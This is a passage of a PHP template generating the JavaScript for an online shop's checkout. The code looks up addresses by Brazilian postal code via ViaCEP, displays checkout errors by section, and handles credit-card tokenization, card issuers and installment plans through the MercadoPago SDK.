		data.estado = {
			id: $('[data-uf="' + data.uf.toUpperCase() + '"]').val(),
		};
		model.endereco_selecionado(data);
	});
}

<?php 
/*
 * busca dados de um cep (rua, estado) via API viacep
 * e executa o callback passado por parametro
 */
?>
buscar_endereco = function(cep, callback){
	if(/^[0-9]{5}\-[0-9]{3}$/.test(cep)){
		// busca o endereco
		$.ajax({
			url:'https://viacep.com.br/ws/' + cep + '/json',
		}).done(callback);
	}
}

<?php 
/*
 * callback do checkout
 * recebe o resultado do checkout
 * mostra os erros ocorridos, caso houverem
 */
?>
compraResultado = function(f, data){
	removeSpinner(f, data);
	
	model.erro_endereco('');
	model.erro_frete('');
	model.erro_cupom('');
	model.erro_pagamento('');
	model.erro_outro('');
	
	if (data.erro > 0) {
		
		switch (data.secao) {
			case 'endereco':
				model.erro_endereco(data.msg);
			break;
			case 'frete':
				model.erro_frete(data.msg);
			break;
			case 'cupom':
				model.erro_cupom(data.msg);
			break;
			case 'pagamento':
				model.erro_pagamento(data.msg);
			break;
			case 'outro':
				model.erro_outro(data.msg);
			break;
		}
		$([document.documentElement, document.body]).animate({
			scrollTop: $("#checkout-erro-" + data.secao).offset().top - 20,
		}, 500);
		
	}
	$('#form-pagamento-submit').html('Finalizar Compra');
}

<?php
/* 
 * Função de loader
 * Esse loader impede que haja qualquer interação na página inteira
 * Usado durante algumas requisições ao mercado pago, pois elas são muito 
 * lentas e podem ser invalidadas com alguma interação que troque o valor 
 * total do pedido, por exemplo
 */
?>
Loader = {
	abrir: function() {
		document.getElementsByTagName('body')[0].classList.add('checkout-loading')
	},
	fechar: function() {
		document.getElementsByTagName('body')[0].classList.remove('checkout-loading');
	}
};

<?php
/* 
 * Callback de submit do formulário de checkout
 */
?>
function trataPagseguroSubmitCompra() {
	var form = document.getElementById('form-checkout');

	<?php
	/* 
	* Se a compra é de cartão de crédito, tem que gerar um hash para enviar para o pagseguro
	* não é possível gerar o hash no backend, 
	* também não é possível fazer uma compra sem o hash do cartão
	*/
	?>
	if (model.pagamento_selecionado() == 'cartao-de-credito') {
		putSpinner(form);

		window.Mercadopago.createToken(form, function(status, response) {
			if (status == 200 || status == 201) {
				let card = document.createElement('input');
				card.setAttribute('name', 'token');
				card.setAttribute('type', 'hidden');
				card.setAttribute('value', response.id);
				form.appendChild(card);

				$(form).attr('data-ajax', '1');
				formAjax(null, form);
			} else {
				alert('Seu cartão de crédito parece estar incorreto.\nPor favor verifique os dados e tente novamente.');
				removeSpinner(form, {});
			}
		});
	}

	<?php
	/* 
	* Outros meios de pagamento podem ser enviados diretamente para o backend
	*/
	?>
	else {
		$(form).attr('data-ajax', '1');
		formAjax(null, form);
	}

	return false;
}

function mercadoPagoLoaded() {
	let public_key = <?= json_encode(Configure::read('MercadoPago.public_key')) ?>;
	window.Mercadopago.setPublishableKey(public_key);
	window.Mercadopago.getIdentificationTypes();
	Loader.fechar();
}

function setPaymentMethod(status, response) {
	if (status == 200) {
		let paymentMethod = response[0];
		document.getElementById('paymentMethodId').value = paymentMethod.id;

		getIssuers(paymentMethod.id);
	} else {
		model.bancos([{
			name: 'Banco emissor',
			id: '',
		}]);
		Loader.fechar();
		alert("Falha ao buscar meio de pagamento. Confira seu número de cartão de crédito.");
	}
}

function getIssuers(paymentMethodId) {
	window.Mercadopago.getIssuers(
		paymentMethodId,
		setIssuers
	);
}

function setIssuers(status, response) {
	if (status == 200) {
		let antes = model.banco_selecionado();
		model.bancos(response);
		let depois = model.banco_selecionado();

		if (antes === depois) { // Inserido para não duplicar a requisição pro Mercado Pago
			model.banco_selecionado.valueHasMutated();
		}
	} else {
		Loader.fechar();
		model.bancos([{
			name: 'Banco emissor',
			id: '',
		}]);
		alert('Erro ao buscar bancos emissores.');
	}
}

function getInstallments(paymentMethodId, transactionAmount, issuerId, desconto) {

	transactionAmount = parseFloat(transactionAmount);

	let callback = desconto ? setInstallmentsComDesconto : setInstallmentsSemDesconto;
	if (desconto) {
		transactionAmount -= model.desconto_cc_a_prazo();
	}

	window.Mercadopago.getInstallments({
		"payment_method_id": paymentMethodId,
		"amount": transactionAmount,
		"issuer_id": parseInt(issuerId)
	}, callback);
}

function setInstallmentsComDesconto(status, response) {
	setInstallments(status, response, 0, <?= Parcelamento::maximoParcelasDescontoPrazo() ?>);
}
function setInstallmentsSemDesconto(status, response) {
	setInstallments(status, response, <?= Parcelamento::maximoParcelasDescontoPrazo() + 1 ?>, 6);
}

function setInstallments(status, response, min, max) {
	if (status == 200) {
		let parcelas = response[0].payer_costs;

		let parcelas_disponiveis = parcelas.filter(function(parcela) {

			if (parcela.installments > <?= max(1, intval(Parcelamento::getQuantidadeMaximaParcelas())) ?>) {
				return false;
			}

			if (parcela.installment_amount < <?= max(1, floatval(Parcelamento::getvalorMinimoParcelas())) ?>) {
				return false;
			}

			return true;
		});

		if (parcelas_disponiveis.length === 0) {
			parcelas_disponiveis = parcelas.slice(0, 1);
		}

		// model.parcelas(parcelas_disponiveis);

		for (let  i = 0; i < parcelas_disponiveis.length; i++) {
			let parcela = parcelas_disponiveis[i];
			if (parcela.installments >= min && parcela.installments <= max) {

				if (parcela.installments === 1) {
					parcela.installment_amount = model.valor_total() - model.desconto_cc_a_vista();
				}

				model.parcelas.push(parcela);
			}
		}

		Loader.fechar();
	} else {
		Loader.fechar();
		alert('Falha ao buscar parcelas.');
	}
}
</script>

<script src="https://secure.mlstatic.com/sdk/javascript/v1/mercadopago.js" onLoad="mercadoPagoLoaded()"></script>
